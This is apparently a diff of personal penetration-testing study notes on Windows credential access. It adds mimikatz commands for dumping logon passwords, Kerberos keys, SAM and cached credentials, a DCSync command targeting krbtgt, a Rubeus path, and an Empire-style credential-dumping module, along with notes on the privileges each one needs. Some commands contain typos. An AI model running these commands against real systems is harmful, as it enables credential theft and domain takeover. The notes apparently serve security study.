@@ -44,13 +44,16 @@ execute
     -set ServiceName Vulnerable Service 3
 
 credential access techniques
-  CH: NTLM Hashes
-  CH: Kerberos eKeys
-  CH: Domain Cached Creds
-  CH: Kerberos Tickets
-  CH: DCSync
+  CH: NTLM Hashes // mimikatz module: sekurlsa::logonpasswords
+  CH: Kerberos eKeys // mimikatz module: sekurlsa::ekeys // command: mimikatz !sekurlsa:logonpasswords
+  CH: Security Acount Manager // mimikatz module: lsadump::sam // command: mimikatz !lsadump::same
+  CH: Domain Cached Creds // lsadump::cache
+  CH: Kerberos Tickets // command: C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+  CH: DCSync // Lsadump::dcsync /domain:dev.example.com/user:EXAMPLE\krbtgt
+    need replication rights // get and see changes permissions // domain admins have them but other could have it
 
 
+to access processes memory I need same or higher user privilege
 -ps // list processes
--usemodule powershell_credentials_minikats_logonpasswords
+-usemodule powershell_credentials_minikats_logonpasswords // dropper had to run as admin so it can use all privileges
 -execute
